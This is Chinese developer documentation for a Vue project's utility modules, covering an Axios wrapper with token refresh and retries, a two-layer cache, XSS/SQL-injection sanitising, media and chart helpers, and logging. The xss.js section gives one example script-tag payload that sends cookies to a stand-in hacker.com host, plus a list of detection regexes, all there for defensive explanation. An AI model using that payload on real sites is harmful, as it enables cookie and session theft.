# 工具函数目录 (utils/)

> 类比：想象一个万能工具箱。你不会每次修东西都从零开始造工具，而是从工具箱里拿现成的扳手、螺丝刀。**utils 就是这个工具箱**，里面装着各种"拿来就能用"的函数，让你不用每次都重复写相同的代码。

## 什么是工具函数？

工具函数（Utility Function）是**不依赖 Vue 组件生命周期**的纯 JavaScript 函数。它们：
- 接收输入参数，返回处理结果
- 不涉及 DOM 操作，不依赖组件实例
- 可以在任何地方调用：组件里、composable 里、甚至其他工具函数里

**判断标准**：如果一个函数"给它同样的输入，永远返回同样的输出"，而且不需要 `this` 或组件上下文，那它就适合放在 utils 里。

## 文件清单

| 文件 | 职责 | 一句话描述 |
|------|------|-----------|
| `request.js` | HTTP 请求 | 封装 Axios，自动加 token、防重复、自动重试 |
| `cache.js` | 数据缓存 | 两层缓存（内存 + sessionStorage），带过期时间 |
| `xss.js` | 安全防护 | 检测和清除 XSS 攻击代码、SQL 注入 |
| `media.js` | 媒体处理 | 文件类型判断、媒体列表解析、下载触发 |
| `chartConfig.js` | 图表配置 | ECharts 图表样式和数据的快捷生成器 |
| `logger.js` | 日志输出 | 开发环境打印日志，生产环境自动静默 |
| `adminUtils.js` | 管理后台 | 表格列配置、状态标签映射、CRUD 接口地址 |
| `index.js` | 统一导出 | 汇总导出所有工具函数，提供通用函数 |

---

## request.js -- 网络请求的"总管家"

这是整个项目最核心的工具文件，所有和后端通信的请求都经过它。

### Axios 是什么？

类比：Axios 就像一个"快递员"，你告诉它要送什么（请求参数）、送到哪（URL），它帮你把东西送过去，再把回信带回来（响应数据）。

```javascript
import axios from 'axios'

// 创建一个"快递员"实例，配置默认信息
const request = axios.create({
  baseURL: '/api',    // 所有请求的公共前缀，相当于快递站地址
  timeout: 60000      // 超时时间 60 秒，超时就放弃
})
```

### 请求拦截器 -- 出发前的检查

类比：快递员出发前，要检查包裹上有没有贴邮票（token）、地址对不对（参数清洗）。

```javascript
request.interceptors.request.use((config) => {
  // 1. 自动带上 token（就像自动贴邮票）
  if (!config.headers.Authorization) {
    const token = sessionStorage.getItem('token')
    if (token) config.headers.Authorization = 'Bearer ' + token
  }

  // 2. 自动带上用户 ID
  const userId = sessionStorage.getItem('userId')
  if (userId) config.headers['userId'] = userId

  // 3. 清洗请求参数，防止 XSS 攻击
  if (config.data && typeof config.data === 'object') {
    config.data = sanitizeRequestData(config.data)  // 自动过滤危险内容
  }

  // 4. 防止重复请求
  if (config.enableCancel !== false) {
    addPendingRequest(config)  // 相同请求自动取消上一个
  }

  return config
})
```

### 响应拦截器 -- 收到回信后的处理

类比：快递员带回回信后，先检查信有没有破损（错误码），再决定怎么处理。

```javascript
request.interceptors.response.use(
  // 成功响应（2xx 状态码）
  (res) => {
    removePendingRequest(res.config)
    // 后端返回 { code: 200, data: ..., msg: '...' }
    if (res.data?.code !== undefined && res.data.code !== 200) {
      return Promise.reject(res.data)  // 业务错误，如 code=500
    }
    return res.data  // 直接返回 data 部分，不用再写 res.data.data
  },

  // 错误响应（4xx、5xx 状态码）
  async (err) => {
    removePendingRequest(err.config)

    // 自动重试：网络波动时最多重试 3 次
    if (shouldRetry(err, err.config)) {
      err.config.__retryCount += 1
      const delay = 1000 * Math.pow(2, err.config.__retryCount - 1)  // 指数退避
      await sleep(delay)
      return request(err.config)  // 重新发送请求
    }

    // 401 未授权：尝试刷新 token
    if (err.response?.status === 401) {
      const newToken = await getOrRefreshToken()  // 刷新令牌
      if (newToken) {
        err.config.headers.Authorization = 'Bearer ' + newToken
        return request(err.config)  // 用新 token 重新请求
      }
      // 刷新失败，跳转登录
    }

    // 403 禁止访问：也可能需要刷新 token
    // ... 其他错误码处理
  }
)
```

### Token 自动刷新机制

当 token 过期时，系统会自动尝试刷新，而不是直接让用户重新登录：

```
请求返回 401
    |
    v
正在刷新 token 吗？（refreshPromise）
    |
    +-- 是 --> 等待刷新完成，拿到新 token
    |
    +-- 否 --> 发起刷新请求
                    |
                    +-- 刷新成功 --> 用新 token 重发原请求
                    +-- 刷新失败 --> 清除登录状态，提示重新登录
```

关键代码：`getOrRefreshToken()` 确保多个请求同时 401 时，只发起一次刷新：

```javascript
async function getOrRefreshToken() {
  // 如果已经在刷新了，直接等待结果（避免多次刷新）
  if (refreshPromise) return refreshPromise

  refreshPromise = refreshToken()  // 发起刷新
  try {
    return await refreshPromise
  } finally {
    refreshPromise = null  // 刷新完成，清除锁
  }
}
```

### 请求去重 -- 防止重复提交

类比：你连续按了 5 次"提交"按钮，系统只发送最后一次请求，前 4 次自动取消。

```javascript
// 生成请求唯一标识：方法 + URL + 参数
function generateRequestKey(config) {
  const { method, url, params, data } = config
  return [method, url, JSON.stringify(params), JSON.stringify(data)].join('&')
}

// 新请求进来时，如果已有相同请求，取消前一个
function addPendingRequest(config) {
  const key = generateRequestKey(config)
  if (pendingRequests.has(key)) {
    const cancel = pendingRequests.get(key)
    cancel(`请求被取消: ${config.url}`)
  }
  config.cancelToken = new axios.CancelToken(cancel => {
    pendingRequests.set(key, cancel)
  })
}
```

### 自动重试 -- 网络波动不怕

```javascript
const RETRY_CONFIG = {
  maxRetries: 3,                    // 最多重试 3 次
  retryDelay: 1000,                 // 基础延迟 1 秒
  retryableStatuses: [408, 429, 500, 502, 503, 504],  // 这些错误码才重试
  retryableMethods: ['get', 'head', 'options']          // 只有 GET 请求才重试
}

// 重试延迟采用指数退避：1s -> 2s -> 4s（越来越慢，给服务器喘息时间）
const delay = RETRY_CONFIG.retryDelay * Math.pow(2, retryCount - 1)
```

**为什么 POST 请求不重试？** 因为 POST 可能已经成功执行了（比如已经扣款了），只是响应丢了，重试可能导致重复操作。

---

## cache.js -- 两层缓存系统

类比：你把常用的东西放在**桌面**（内存缓存，超快但关机就没了），不太常用但重要的放在**抽屉**（sessionStorage，关浏览器才没），都不会放在**仓库**（localStorage，长期保存）。

### 两层缓存架构

```
读取数据时：
  先查内存缓存（超快，纳秒级）
    |
    +-- 命中 --> 直接返回
    |
    +-- 未命中 --> 查 sessionStorage（稍慢，毫秒级）
                        |
                        +-- 命中 --> 返回数据
                        +-- 未命中 --> 返回 null，需要重新请求 API

写入数据时：
  同时写入内存 + sessionStorage（双保险）
```

### TTL -- 缓存过期时间

每种数据的"保鲜期"不同，在 `cacheConfig` 中配置：

```javascript
const cacheConfig = {
  plants:       { ttl: 10 * 60 * 1000, storage: 'session' },  // 药用植物：10 分钟
  knowledge:    { ttl: 10 * 60 * 1000, storage: 'session' },  // 知识库：10 分钟
  categories:   { ttl: 30 * 60 * 1000, storage: 'session' },  // 分类数据：30 分钟（很少变）
  quizQuestions: { ttl: 5 * 60 * 1000,  storage: 'memory' },  // 答题题目：5 分钟（只存内存）
  leaderboard:  { ttl: 2 * 60 * 1000,  storage: 'memory' },   // 排行榜：2 分钟（只存内存）
  userInfo:     { ttl: 30 * 60 * 1000, storage: 'session' }   // 用户信息：30 分钟
}
```

**为什么排行榜只存内存？** 因为排行榜变化频繁，页面刷新后应该重新获取最新数据。

### createCachedFetcher -- 自动缓存的数据获取器

这是最方便的用法，把"先查缓存、没有就请求 API、再存缓存"的流程封装起来：

```javascript
import { createCachedFetcher } from '@/utils/cache'
import request from '@/utils/request'

// 创建一个带缓存的获取函数
const fetchPlants = createCachedFetcher(
  (page, size) => request.get('/plants/list', { params: { page, size } }),
  'plants'  // 对应 cacheConfig 中的配置
)

// 使用时就像普通函数一样调用
const data = await fetchPlants(1, 12)
// 第一次调用：发 API 请求，结果自动缓存
// 第二次调用（10 分钟内）：直接返回缓存，不发请求
```

### 缓存清理

```javascript
// 自动清理：每 60 秒清除一次过期缓存
startCacheCleanup()

// 手动清理
cache.remove('plants')      // 删除指定缓存
cache.clear()               // 清空所有缓存
cache.clearExpired()         // 只清除过期的缓存
```

---

## xss.js -- 安全防护盾

类比：XSS 攻击就像有人在你的信件里夹带了危险物品。`xss.js` 就是安检机，检测并清除这些危险内容。

### 什么是 XSS？

XSS（跨站脚本攻击）是黑客在输入框里注入恶意 JavaScript 代码，比如：

```javascript
// 用户在评论框里输入了这样的内容：
"<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>"

// 如果不做处理，其他用户看到这条评论时，代码就会执行，cookie 就被偷走了！
```

### 30+ 种攻击模式检测

`xss.js` 内置了 30 多种 XSS 攻击模式的正则表达式：

```javascript
const XSS_PATTERNS = [
  /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,  // <script> 标签
  /javascript\s*:/gi,       // javascript: 伪协议
  /on\w+\s*=/gi,            // 事件处理器 onclick= onload=
  /eval\s*\(/gi,            // eval() 函数调用
  /<iframe/gi,              // iframe 嵌入
  /<object/gi,              // object 嵌入
  /<embed/gi,               // embed 嵌入
  // ... 还有 20+ 种模式
]
```

### 核心函数

```javascript
// 检测是否包含 XSS 攻击代码
containsXss(input)   // 返回 true/false

// 清除 XSS 攻击代码（HTML 实体编码）
sanitize(input)      // 把 < > " ' 等转义为 &lt; &gt; 等

// 检测 SQL 注入
containsSqlInjection(input)  // 检测 SELECT, DROP, UNION 等

// 综合验证
validateInput(input, {
  maxLength: 1000,          // 最大长度
  allowHtml: false,         // 是否允许 HTML
  checkSqlInjection: true,  // 是否检查 SQL 注入
  required: false           // 是否必填
})
// 返回 { valid: true/false, error: '错误信息' }
```

### 在 request.js 中的自动防护

请求拦截器会自动对所有请求参数进行安全清洗：

```javascript
// 自动遍历请求参数中的所有字符串字段
function sanitizeRequestData(data) {
  for (const [key, value] of Object.entries(data)) {
    if (typeof value === 'string') {
      if (containsXss(value) || containsSqlInjection(value)) {
        logSecurityWarn(key, sanitizeForLog(value))  // 记录安全日志
        sanitized[key] = sanitize(value)              // 自动清洗
      }
    }
  }
}
```

---

## media.js -- 媒体文件处理

类比：media.js 就像一个"文件分类员"，看到 `.mp4` 就知道是视频，看到 `.pdf` 就知道是文档，帮你把杂乱的文件整理得井井有条。

### 文件类型判断

```javascript
import { getMediaType, getFileType, getFileIcon, getFileColor } from '@/utils/media'

getMediaType('/uploads/video.mp4')   // 返回 'video'
getMediaType('/uploads/photo.jpg')   // 返回 'image'
getMediaType('/uploads/report.pdf')  // 返回 'document'

getFileType('/uploads/report.xlsx')  // 返回 'excel'
getFileIcon('pdf')                   // 返回 Tickets 图标组件
getFileColor('word')                 // 返回 '#409eff'（蓝色）
```

### 媒体列表解析 -- parseMediaList

后端返回的媒体数据格式可能各种各样，`parseMediaList` 统一处理：

```javascript
import { parseMediaList } from '@/utils/media'

// 情况 1：JSON 字符串
parseMediaList('["/img/1.jpg", "/img/2.jpg"]')

// 情况 2：逗号分隔字符串
parseMediaList('/img/1.jpg, /img/2.jpg, /img/3.jpg')

// 情况 3：对象数组
parseMediaList([
  { path: '/img/1.jpg', name: '钩藤图片', size: 1024 },
  { path: '/img/2.jpg', name: '透骨草图片', size: 2048 }
])

// 以上三种输入，输出格式统一为：
// [
//   { url: '/img/1.jpg', path: '/img/1.jpg', name: '1.jpg', size: 0, type: 'image' },
//   { url: '/img/2.jpg', path: '/img/2.jpg', name: '2.jpg', size: 0, type: 'image' }
// ]
```

### 按类型分离媒体

```javascript
import { separateMediaByType } from '@/utils/media'

const files = parseMediaList(rawData)
const { images, videos, documents } = separateMediaByType(files)
// images:    所有图片文件
// videos:    所有视频文件
// documents: 所有文档文件
```

---

## chartConfig.js -- ECharts 配置助手

类比：chartConfig.js 就像"图表装修公司"，你只需要告诉它数据，它帮你把图表装修得漂漂亮亮。

### 渐变色配置

```javascript
import { GRADIENT_COLORS, COLOR_PALETTE, createLinearGradient } from '@/utils/chartConfig'

// 预设渐变色
GRADIENT_COLORS.blue   // { start: '#1A5276', end: '#5DADE2' }
GRADIENT_COLORS.green  // { start: '#1E8449', end: '#58D68D' }
GRADIENT_COLORS.gold   // { start: '#B7950B', end: '#F4D03F' }

// 创建线性渐变
createLinearGradient('#1A5276', '#5DADE2')
// 返回 ECharts 可用的渐变配置对象
```

### 快速创建图表系列

```javascript
import { createBarSeries, createLineSeries, createPieSeries, createRadarSeries } from '@/utils/chartConfig'

// 柱状图：传入数据 + 渐变色
const barSeries = createBarSeries([120, 200, 150, 80, 70], GRADIENT_COLORS.blue)

// 折线图：自动带面积填充
const lineSeries = createLineSeries([120, 200, 150], GRADIENT_COLORS.green)

// 饼图：自动配置标签、高亮效果
const pieSeries = createPieSeries([
  { name: '药方', value: 30 },
  { name: '推拿', value: 20 },
  { name: '药浴', value: 15 }
])

// 雷达图
const radarSeries = createRadarSeries([80, 90, 70, 85, 60], GRADIENT_COLORS.purple)
```

---

## logger.js -- 开发环境日志

类比：logger.js 就像"对讲机"，开发时你可以和对讲机说话（打印日志），上线后对讲机自动关闭（生产环境不打印）。

```javascript
import logger, { logFetchError, logAuthWarn, logSecurityWarn } from '@/utils/logger'

// 基础日志（只在开发环境打印）
logger.log('普通日志')     // 开发环境：[LOG] 普通日志    生产环境：不打印
logger.debug('调试信息')   // 开发环境：[DEBUG] 调试信息  生产环境：不打印
logger.warn('警告')        // 两种环境都打印
logger.error('错误')       // 两种环境都打印

// 业务日志函数
logFetchError('药用植物', error)           // 获取数据失败时记录
logAuthWarn('权限不足')                     // 权限问题时记录
logSecurityWarn('comment', '<script>...')   // 检测到攻击时记录
```

**原理**：通过 `import.meta.env.DEV` 判断当前是否为开发环境。

---

## adminUtils.js -- 管理后台专用

类比：adminUtils.js 是管理后台的"配置手册"，告诉表格该显示哪些列、标签该用什么颜色。

### 状态标签映射

```javascript
import { getDifficultyTagType, getDifficultyText, getFeedbackStatusTag } from '@/utils/adminUtils'

getDifficultyTagType('easy')       // 返回 'success'（绿色标签）
getDifficultyText('easy')          // 返回 '入门'
getFeedbackStatusTag('pending')    // 返回 'warning'（黄色标签）
```

### 表格列配置 -- TABLE_CONFIGS

定义了管理后台每个模块的表格列：

```javascript
import { TABLE_CONFIGS } from '@/utils/adminUtils'

TABLE_CONFIGS.plants.columns
// [
//   { prop: 'scientificName', label: '学名', minWidth: 120 },
//   { prop: 'category', label: '分类', width: 80 },
//   { prop: 'usageWay', label: '用法', width: 70 }
// ]
```

---

## index.js -- 通用工具函数

这是最常用的文件，包含各种日常开发中频繁使用的小工具：

### 时间格式化 -- formatTime

```javascript
import { formatTime } from '@/utils'

formatTime(new Date())               // "3分钟前"（相对时间）
formatTime(new Date(), { format: 'date' })     // "2026/4/23"
formatTime(new Date(), { format: 'datetime' })  // "2026/4/23 14:30"
formatTime(new Date(), { format: 'full' })      // 完整格式，不显示相对时间
```

### 防抖和节流

```javascript
import { debounce, throttle } from '@/utils'

// 防抖：连续点击只在最后一次点击后 300ms 执行（类似电梯等人）
const handleSearch = debounce((keyword) => {
  console.log('搜索:', keyword)
}, 300)

// 节流：无论点击多快，每 300ms 最多执行一次（类似红绿灯）
const handleScroll = throttle(() => {
  console.log('滚动位置:', window.scrollY)
}, 300)
```

**防抖 vs 节流的区别**：
- 防抖：你一直在输入，我就一直等，等你停下来 300ms 我才搜索
- 节流：你在疯狂滚动，我不管你，但我每 300ms 才处理一次

### 数据提取 -- extractData

后端返回的数据格式不统一？`extractData` 帮你自动提取：

```javascript
import { extractData, extractPageData } from '@/utils'

// 各种可能的响应格式，都能正确提取数组
extractData({ data: [...] })
extractData({ data: { records: [...] } })
extractData({ data: { data: [...] } })
extractData([...])

// 分页数据提取
extractPageData(res)
// 返回 { records: [], total: 0, page: 1, size: 12 }
```

### 其他常用函数

```javascript
import { formatFileSize, truncate, deepClone, isEmpty, generateId, sleep, retry } from '@/utils'

formatFileSize(1024)          // "1.0 KB"
formatFileSize(1048576)       // "1.0 MB"
truncate('很长的文本...', 10)  // "很长的文本..."（超过10字截断加...）
deepClone({ a: 1, b: { c: 2 } })  // 深拷贝，修改副本不影响原对象
isEmpty(null)                 // true
isEmpty('')                   // true
isEmpty([])                   // true
isEmpty({})                   // true
generateId()                  // 生成唯一 ID，如 "m5x7k2a9p"
sleep(1000)                   // 等待 1 秒（异步）
retry(fn, 3, 1000)            // 失败自动重试 3 次，间隔 1 秒
```

## 常见错误

### 错误 1：直接用 axios 而不是 request

```javascript
// 错误：绕过了拦截器，不会自动加 token、不会自动重试
import axios from 'axios'
axios.get('/api/plants')

// 正确：使用项目封装的 request
import request from '@/utils/request'
request.get('/plants')
```

### 错误 2：缓存 key 不一致

```javascript
// 错误：两次调用用了不同的 key，缓存无法命中
cache.set('plants_list', data)
cache.get('plants')  // key 不一致，返回 null

// 正确：读写使用相同的 key
cache.set('plants', data)
cache.get('plants')  // 命中缓存
```

### 错误 3：忘记清理定时器或缓存

```javascript
// 错误：组件销毁后缓存清理定时器还在跑
// （cache.js 已经自动处理了，但自己写的定时器要注意）

// 正确：组件销毁时清理
import { onUnmounted } from 'vue'
let timer = setInterval(() => { ... }, 1000)
onUnmounted(() => clearInterval(timer))
```

### 错误 4：在生产环境用 console.log

```javascript
// 错误：生产环境会暴露信息，影响性能
console.log('用户数据:', userData)

// 正确：使用 logger，生产环境自动静默
import logger from '@/utils/logger'
logger.log('用户数据:', userData)  // 只在开发环境打印
logger.error('严重错误:', error)    // 任何环境都打印
```
